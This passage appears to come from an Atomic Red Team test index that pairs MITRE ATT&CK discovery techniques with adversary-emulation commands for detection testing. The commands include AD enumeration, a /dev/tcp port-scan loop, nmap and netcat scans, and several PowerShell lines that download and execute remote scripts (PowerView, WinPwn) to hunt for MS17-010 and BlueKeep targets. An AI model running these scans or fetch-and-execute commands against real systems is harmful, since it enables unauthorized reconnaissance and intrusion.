      executor:
        command: 'ip neighbour show

          '
        name: sh
    - name: Remote System Discovery - ip route
      auto_generated_guid: 1a4ebe70-31d0-417b-ade2-ef4cb3e7d0e1
      description: "Use the ip route command to display the kernels routing tables.
        \n"
      supported_platforms:
      - linux
      dependency_executor_name: sh
      dependencies:
      - description: 'Check if ip command exists on the machine

          '
        prereq_command: 'if [ -x "$(command -v ip)" ]; then exit 0; else exit 1; fi;

          '
        get_prereq_command: 'apt-get install iproute2 -y

          '
      executor:
        command: 'ip route show

          '
        name: sh
    - name: Remote System Discovery - ip tcp_metrics
      auto_generated_guid: 6c2da894-0b57-43cb-87af-46ea3b501388
      description: "Use the ip tcp_metrics command to display the recent cached entries
        for IPv4 and IPv6 source and destination addresses. \n"
      supported_platforms:
      - linux
      dependency_executor_name: sh
      dependencies:
      - description: 'Check if ip command exists on the machine

          '
        prereq_command: 'if [ -x "$(command -v ip)" ]; then exit 0; else exit 1; fi;

          '
        get_prereq_command: 'apt-get install iproute2 -y

          '
      executor:
        command: 'ip tcp_metrics show |grep --invert-match "^127\."

          '
        name: sh
    - name: Enumerate domain computers within Active Directory using DirectorySearcher
      auto_generated_guid: 962a6017-1c09-45a6-880b-adc9c57cb22e
      description: "This test is a Powershell script that enumerates Active Directory
        to determine computers that are joined to the domain. \nThis test is designed
        to mimic how SessionGopher can determine the additional systems within a domain,
        which has been used before by threat actors to aid in lateral movement. \nReference:
        [Head Fake: Tackling Disruptive Ransomware Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks).
        \nUpon successful execution, this test will output the names of the computers
        that reside on the domain to the console window. \n"
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: This PC must be joined to a domain.
        prereq_command: if ((Get-WmiObject -Class Win32_ComputerSystem).partofdomain
          -eq $true) {exit 0} else {exit 1}
        get_prereq_command: 'write-host "This PC must be manually added to a domain." '
      executor:
        command: |
          $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher("(ObjectCategory=Computer)")
          $DirectorySearcher.PropertiesToLoad.Add("Name")
          $Computers = $DirectorySearcher.findall()
          foreach ($Computer in $Computers) {
            $Computer = $Computer.Properties.name
            if (!$Computer) { Continue }
            Write-Host $Computer}
        name: powershell
        elevation_required: false
    - name: Enumerate Active Directory Computers with Get-AdComputer
      auto_generated_guid: 97e89d9e-e3f5-41b5-a90f-1e0825df0fdf
      description: |
        The following Atomic test will utilize Get-AdComputer to enumerate Computers within Active Directory.
        Upon successful execution a listing of Computers will output with their paths in AD.
        Reference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md
      supported_platforms:
      - windows
      executor:
        name: powershell
        elevation_required: false
        command: 'Get-AdComputer -Filter *

          '
    - name: Enumerate Active Directory Computers with ADSISearcher
      auto_generated_guid: 64ede6ac-b57a-41c2-a7d1-32c6cd35397d
      description: |
        The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory.
        Upon successful execution a listing of computers will output with their paths in AD.
        Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/
      supported_platforms:
      - windows
      executor:
        name: powershell
        elevation_required: false
        command: '([adsisearcher]"objectcategory=computer").FindAll(); ([adsisearcher]"objectcategory=computer").FindOne()

          '
    - name: Get-DomainController with PowerView
      auto_generated_guid: b9d2e8ca-5520-4737-8076-4f08913da2c4
      description: 'Utilizing PowerView, run Get-DomainController to identify the
        Domain Controller. Upon execution, information about the domain controller
        within the domain will be displayed.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose
        name: powershell
    - name: Get-WmiObject to Enumerate Domain Controllers
      auto_generated_guid: e3cf5123-f6c9-4375-bdf2-1bb3ba43a1ad
      description: |
        The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.
        Upon successful execution a listing of Systems from AD will output with their paths.
        Reference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1
      supported_platforms:
      - windows
      executor:
        name: powershell
        elevation_required: false
        command: 'get-wmiobject -class ds_computer -namespace root\directory\ldap

          '
    - name: Remote System Discovery - net group Domain Controller
      auto_generated_guid: 5843529a-5056-4bc1-9c13-a311e2af4ca0
      description: |
        Identify remote systems with net.exe querying the Active Directory Domain Controller.
        Upon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the "Domain Controller" in the domain. Output will be via stdout.
      supported_platforms:
      - windows
      executor:
        command: 'net group /domain "Domain controllers"

          '
        name: command_prompt
  T1046:
    technique:
      modified: '2023-03-30T21:01:43.682Z'
      name: Network Service Discovery
      description: "Adversaries may attempt to get a listing of services running on
        remote hosts and local network infrastructure devices, including those that
        may be vulnerable to remote software exploitation. Common methods to acquire
        this information include port and/or vulnerability scans using tools that
        are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)   \n\nWithin
        cloud environments, adversaries may attempt to discover services running on
        other cloud hosts. Additionally, if the cloud environment is connected to
        a on-premises environment, adversaries may be able to identify services running
        on non-cloud systems as well.\n\nWithin macOS environments, adversaries may
        use the native Bonjour application to discover services running on other macOS
        hosts within a network. The Bonjour mDNSResponder daemon automatically registers
        and advertises a host’s registered services on the network. For example, adversaries
        can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find
        other systems broadcasting the ssh service.(Citation: apple doco bonjour description)(Citation:
        macOS APT Activity Bradley)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_contributors:
      - Praetorian
      x_mitre_deprecated: false
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Normal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - IaaS
      - Linux
      - macOS
      - Containers
      - Network
      x_mitre_version: '3.0'
      x_mitre_data_sources:
      - 'Cloud Service: Cloud Service Enumeration'
      - 'Command: Command Execution'
      - 'Network Traffic: Network Traffic Flow'
      type: attack-pattern
      id: attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88
      created: '2017-05-31T21:30:43.915Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1046
        external_id: T1046
      - source_name: apple doco bonjour description
        description: Apple Inc. (2013, April 23). Bonjour Overview. Retrieved October
          11, 2021.
        url: https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/NetServices/Introduction.html
      - source_name: CISA AR21-126A FIVEHANDS May 2021
        description: CISA. (2021, May 6). Analysis Report (AR21-126A) FiveHands Ransomware.
          Retrieved June 7, 2021.
        url: https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a
      - source_name: macOS APT Activity Bradley
        description: Jaron Bradley. (2021, November 14). What does APT Activity Look
          Like on macOS?. Retrieved January 19, 2022.
        url: https://themittenmac.com/what-does-apt-activity-look-like-on-macos/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      identifier: T1046
    atomic_tests:
    - name: Port Scan
      auto_generated_guid: 68e907da-2539-48f6-9fc9-257a78c05540
      description: |
        Scan ports to check for listening ports.

        Upon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.
      supported_platforms:
      - linux
      - macos
      input_arguments:
        host:
          description: Host to scan.
          type: string
          default: 192.168.1.1
      executor:
        command: 'for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port)
          && echo port $port is open ; done

          '
        name: bash
    - name: Port Scan Nmap
      auto_generated_guid: 515942b0-a09f-4163-a7bb-22fefb6f185f
      description: |
        Scan ports to check for listening ports with Nmap.

        Upon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of addresses on port 80 to determine if listening. Results will be via stdout.
      supported_platforms:
      - linux
      - macos
      input_arguments:
        host:
          description: Host to scan.
          type: string
          default: 192.168.1.1
        port:
          description: Ports to scan.
          type: string
          default: '80'
        network_range:
          description: Network Range to Scan.
          type: string
          default: 192.168.1.0/24
      dependency_executor_name: sh
      dependencies:
      - description: 'Check if nmap command exists on the machine

          '
        prereq_command: 'if [ -x "$(command -v nmap)" ]; then exit 0; else exit 1;
          fi;

          '
        get_prereq_command: "(which yum && yum -y install epel-release nmap)||(which
          apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)\n"
      - description: 'Check if nc command exists on the machine

          '
        prereq_command: 'if [ -x "$(command -v nc)" ]; then exit 0; else exit 1; fi;

          '
        get_prereq_command: "(which yum && yum -y install epel-release nc)||(which
          apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat)\n"
      - description: 'Check if telnet command exists on the machine

          '
        prereq_command: 'if [ -x "$(command -v telnet)" ]; then exit 0; else exit
          1; fi;

          '
        get_prereq_command: "(which yum && yum -y install epel-release telnet)||(which
          apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet)\n"
      executor:
        command: |
          sudo nmap -sS #{network_range} -p #{port}
          telnet #{host} #{port}
          nc -nv #{host} #{port}
        name: sh
        elevation_required: true
    - name: Port Scan NMap for Windows
      auto_generated_guid: d696a3cb-d7a8-4976-8eb5-5af4abf2e3df
      description: Scan ports to check for listening ports for the local host 127.0.0.1
      supported_platforms:
      - windows
      input_arguments:
        nmap_url:
          description: NMap installer download URL
          type: url
          default: https://nmap.org/dist/nmap-7.80-setup.exe
        host_to_scan:
          description: The host to scan with NMap
          type: string
          default: 127.0.0.1
      dependency_executor_name: powershell
      dependencies:
      - description: 'NMap must be installed

          '
        prereq_command: if (cmd /c "nmap 2>nul") {exit 0} else {exit 1}
        get_prereq_command: |
          Invoke-WebRequest -OutFile $env:temp\nmap-7.80-setup.exe #{nmap_url}
          Start-Process $env:temp\nmap-7.80-setup.exe /S
      executor:
        command: 'nmap #{host_to_scan}'
        name: powershell
        elevation_required: true
    - name: Port Scan using python
      auto_generated_guid: 6ca45b04-9f15-4424-b9d3-84a217285a5c
      description: 'Scan ports to check for listening ports with python

        '
      supported_platforms:
      - windows
      input_arguments:
        host_ip:
          description: Host to scan.
          type: string
          default: 127.0.0.1
        filename:
          description: Location of the project file
          type: path
          default: PathToAtomicsFolder\T1046\src\T1046.py
      dependency_executor_name: powershell
      dependencies:
      - description: 'Check if python exists on the machine

          '
        prereq_command: 'if (python --version) {exit 0} else {exit 1}

          '
        get_prereq_command: 'echo "Python 3 must be installed manually"

          '
      executor:
        command: 'python #{filename} -i #{host_ip}

          '
        name: powershell
    - name: WinPwn - spoolvulnscan
      auto_generated_guid: 54574908-f1de-4356-9021-8053dd57439a
      description: Start MS-RPRN RPC Service Scan using spoolvulnscan function of
        WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          spoolvulnscan -noninteractive -consoleoutput
        name: powershell
    - name: WinPwn - MS17-10
      auto_generated_guid: 97585b04-5be2-40e9-8c31-82157b8af2d6
      description: Search for MS17-10 vulnerable Windows Servers in the domain using
        powerSQL function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          MS17-10 -noninteractive -consoleoutput
        name: powershell
    - name: WinPwn - bluekeep
      auto_generated_guid: 1cca5640-32a9-46e6-b8e0-fabbe2384a73
      description: Search for bluekeep vulnerable Windows Systems in the domain using
        bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds
        in testing on a small domain).
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          bluekeep -noninteractive -consoleoutput
        name: powershell
    - name: WinPwn - fruit
      auto_generated_guid: bb037826-cbe8-4a41-93ea-b94059d6bb98
      description: Search for potentially vulnerable web apps (low hanging fruits)
        using fruit function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          fruit -noninteractive -consoleoutput
        name: powershell
    - name: Network Service Discovery for Containers
      auto_generated_guid: 06eaafdb-8982-426e-8a31-d572da633caa
      description: Attackers may try to obtain a list of services that are operating
        on remote hosts and local network infrastructure devices, in order to identify
        potential vulnerabilities that can be exploited through remote software attacks.
        They typically use tools to conduct port and vulnerability scans in order
        to obtain this information.
      supported_platforms:
      - containers
      dependency_executor_name: sh
      dependencies:
      - description: Verify docker is installed.
        prereq_command: 'which docker

          '
        get_prereq_command: 'if [ "" == "`which docker`" ]; then echo "Docker Not
          Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker
          ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else
          echo "Docker installed"; fi

          '
      - description: Verify docker service is running.
        prereq_command: 'sudo systemctl status docker  --no-pager

          '
        get_prereq_command: 'sudo systemctl start docker

          '
      executor:
        command: |-
          docker build -t t1046 /root/AtomicRedTeam/atomics/T1046/src/
          docker run --name t1046_container  -d -t t1046
          docker exec t1046_container ./test.sh
        cleanup_command: |-
          docker stop t1046_container
          docker rmi -f t1046
        name: sh
  T1518:
    technique:
      modified: '2023-03-30T21:01:50.920Z'
      name: Software Discovery
      description: |-
        Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

        Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
      x_mitre_domains:
      - enterprise-attack
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Google Workspace
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Process: OS API Execution'
      - 'Process: Process Creation'
      - 'Firewall: Firewall Enumeration'
      - 'Command: Command Execution'
      - 'Firewall: Firewall Metadata'
      x_mitre_permissions_required:
      - User
      - Administrator
      type: attack-pattern
      id: attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58
      created: '2019-09-16T17:52:44.147Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1518
        external_id: T1518
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_is_subtechnique: false
      identifier: T1518
    atomic_tests:
    - name: Find and Display Internet Explorer Browser Version
      auto_generated_guid: 68981660-6670-47ee-a5fa-7e74806420a4
      description: |
        Query the registry to determine the version of internet explorer installed on the system.
        Upon execution, version information about internet explorer will be displayed.
      supported_platforms:
      - windows
      executor:
        command: 'reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer"
          /v svcVersion

          '
        name: command_prompt
    - name: Applications Installed
      auto_generated_guid: c49978f6-bd6e-4221-ad2c-9e3e30cc1e3b
      description: |
        Query the registry to determine software and versions installed on the system. Upon execution a table of
        software name and version information will be displayed.
      supported_platforms:
      - windows
      executor:
        command: |
          Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
          Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
        name: powershell
    - name: Find and Display Safari Browser Version
      auto_generated_guid: 103d6533-fd2a-4d08-976a-4a598565280f
      description: 'Adversaries may attempt to get a listing of non-security related
        software that is installed on the system. Adversaries may use the information
        from Software Discovery during automated discovery to shape follow-on behaviors

        '
      supported_platforms:
      - macos
      executor:
        name: sh
        elevation_required: false
        command: |
          /usr/libexec/PlistBuddy -c "print :CFBundleShortVersionString" /Applications/Safari.app/Contents/Info.plist
          /usr/libexec/PlistBuddy -c "print :CFBundleVersion" /Applications/Safari.app/Contents/Info.plist
    - name: WinPwn - Dotnetsearch
      auto_generated_guid: 7e79a1b6-519e-433c-ad55-3ff293667101
      description: Search for any .NET binary file in a share using the Dotnetsearch
        function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          Dotnetsearch -noninteractive -consoleoutput
        name: powershell
    - name: WinPwn - DotNet
      auto_generated_guid: 10ba02d0-ab76-4f80-940d-451633f24c5b
      description: Search for .NET Service-Binaries on this system via winpwn dotnet
        function of WinPwn.
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          dotnet -consoleoutput -noninteractive
        name: powershell
    - name: WinPwn - powerSQL
      auto_generated_guid: 0bb64470-582a-4155-bde2-d6003a95ed34
      description: Start PowerUpSQL Checks using powerSQL function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          powerSQL -noninteractive -consoleoutput
        name: powershell
  T1538:
    technique:
      x_mitre_platforms:
      - Azure AD
      - Office 365
      - IaaS
      - Google Workspace
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Praetorian
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--e49920b0-6c54-40c1-9571-73723653205f
      type: attack-pattern
      created: '2019-08-30T18:11:24.582Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - external_id: T1538
        source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1538
      - source_name: Google Command Center Dashboard
        url: https://cloud.google.com/security-command-center/docs/quickstart-scc-dashboard
        description: 'Google. (2019, October 3). Quickstart: Using the dashboard.
          Retrieved October 8, 2019.'
      - source_name: AWS Console Sign-in Events
        url: https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-aws-console-sign-in-events.html
        description: Amazon. (n.d.). AWS Console Sign-in Events. Retrieved October
          23, 2019.
      modified: '2021-03-16T12:56:36.098Z'
      name: Cloud Service Dashboard
      description: |-
        An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)

        Depending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_detection: 'Monitor account activity logs to see actions performed and
        activity associated with the cloud service management console. Some cloud
        providers, such as AWS, provide distinct log events for login attempts to
        the management console.(Citation: AWS Console Sign-in Events)'
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Logon Session: Logon Session Creation'
      - 'User Account: User Account Authentication'
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1622:
    technique:
      x_mitre_platforms:
      - Windows
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - TruKno
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--e4dc8c01-417f-458d-9ee0-bb0617c1b391
      created: '2022-04-01T17:59:46.156Z'
      x_mitre_version: '1.0'
      external_references:
      - source_name: mitre-attack
        external_id: T1622
        url: https://attack.mitre.org/techniques/T1622
      - source_name: Checkpoint Dridex Jan 2021
        url: https://research.checkpoint.com/2021/stopping-serial-killer-catching-the-next-strike/
        description: 'Check Point Research. (2021, January 4). Stopping Serial Killer:
          Catching the Next Strike. Retrieved September 7, 2021.'
      - source_name: hasherezade debug
        url: https://github.com/hasherezade/malware_training_vol1/blob/main/slides/module3/Module3_2_fingerprinting.pdf
        description: hasherezade. (2021, June 30). Module 3 - Understanding and countering
          malware's evasion and self-defence. Retrieved April 1, 2022.
      - source_name: AlKhaser Debug
        url: https://github.com/LordNoteworthy/al-khaser/tree/master/al-khaser/AntiDebug
        description: Noteworthy. (2019, January 6). Al-Khaser. Retrieved April 1,
          2022.
      - source_name: wardle evilquest partii
        url: https://objective-see.com/blog/blog_0x60.html
        description: 'Patrick Wardle. (2020, July 3). OSX.EvilQuest Uncovered part
          ii: insidious capabilities. Retrieved March 21, 2021.'
      - source_name: ProcessHacker Github
        url: https://github.com/processhacker/processhacker
        description: ProcessHacker. (2009, October 27). Process Hacker. Retrieved
          April 11, 2022.
      - source_name: vxunderground debug
        url: https://github.com/vxunderground/VX-API/tree/main/Anti%20Debug
        description: vxunderground. (2021, June 30). VX-API. Retrieved April 1, 2022.
      x_mitre_deprecated: false
      revoked: false
      description: |-
        Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.(Citation: ProcessHacker Github)

        Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.

        Specific checks will vary based on the target and/or adversary, but may involve [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would “swallow? or handle the potential error).(Citation: hasherezade debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug)

        Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>OutputDebugStringW()</code>.(Citation: wardle evilquest partii)(Citation: Checkpoint Dridex Jan 2021)
      modified: '2022-04-16T15:05:55.918Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Debugger Evasion
      x_mitre_detection: |-
        Debugger related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to debugger identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious [Native API](https://attack.mitre.org/techniques/T1106) function calls as well as processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.

        Monitor debugger logs for signs of abnormal and potentially malicious activity.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'Process: OS API Execution'
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1124:
    technique:
      modified: '2023-04-12T23:37:22.508Z'
      name: System Time Discovery
      description: |-
        An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time)(Citation: Technet Windows Time Service)

        System time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>.(Citation: Technet Windows Time Service)

        On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show clock detail` can be used to see the current time configuration.(Citation: show_clock_detail_cisco_cmd)

        This information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)(Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - FIRST.ORG's Cyber Threat Intelligence SIG
      - Austin Clark, @c2defense
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.

        For network infrastructure devices, collect AAA logging to monitor `show` commands being run by non-standard users from non-standard locations.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Windows
      - Network
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      - 'Process: OS API Execution'
      type: attack-pattern
      id: attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077
      created: '2017-05-31T21:31:37.450Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1124
        external_id: T1124
      - source_name: show_clock_detail_cisco_cmd
        description: 'Cisco. (2023, March 6). show clock detail - Cisco IOS Security
          Command Reference: Commands S to Z . Retrieved July 13, 2022.'
        url: https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/security/s1/sec-s1-cr-book/sec-cr-s2.html#wp1896741674
      - source_name: AnyRun TimeBomb
        description: 'Malicious History. (2020, September 17). Time Bombs: Malware
          With Delayed Execution. Retrieved April 22, 2021.'
        url: https://any.run/cybersecurity-blog/time-bombs-malware-with-delayed-execution/
      - source_name: Technet Windows Time Service
        description: Mathers, B. (2016, September 30). Windows Time Service Tools
          and Settings. Retrieved November 25, 2016.
        url: https://technet.microsoft.com/windows-server-docs/identity/ad-ds/get-started/windows-time-service/windows-time-service-tools-and-settings
      - source_name: MSDN System Time
        description: Microsoft. (n.d.). System Time. Retrieved November 25, 2016.
        url: https://msdn.microsoft.com/ms724961.aspx
      - source_name: RSA EU12 They're Inside
        description: Rivner, U., Schwartz, E. (2012). They’re Inside… Now What?. Retrieved
          November 25, 2016.
        url: https://www.rsaconference.com/writable/presentations/file_upload/ht-209_rivner_schwartz.pdf
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
